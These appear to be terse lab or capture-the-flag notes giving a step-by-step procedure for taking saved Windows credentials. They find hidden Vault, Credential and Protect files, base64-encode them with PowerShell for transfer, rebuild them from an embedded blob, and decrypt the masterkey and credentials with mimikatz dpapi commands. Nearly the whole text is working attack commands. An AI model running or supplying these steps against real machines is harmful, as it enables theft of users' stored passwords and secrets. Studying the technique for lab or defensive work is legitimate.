### Credentials and masterkeys identification:

#### 1) cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS

#### Credentials are 32 character strings and masterkeys are GUIDs

#### 2) Transfer them with powershell

#### [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))

#### [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580")

#### 3) Convert them back to the original files to examine them with mimikatz

#### [IO.File]::WriteAllBytes("51AB168BE4BDB3A603DADE4F8CA81290",[Convert]::FromBase64String("AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ=="))

#### 4) Extract credentials with mimikatz:

#### mimikatzcmd:> dpapi::cred /in:CREDENTIAL_STRING_CHARS /sid:SID /password:CURRENT_USER_PASSWORD

#### mimikatzcmd:. dpapi::masterkey /in:MASTERKEY_GUID_CHARS /sid:SID /password:CURRENT_USER_PASSWORD

#### Credential blob can now be decrypted

#### mimikatzcmd:> dpapi::cred /in:CREDENTIAL_STRING_CHARS
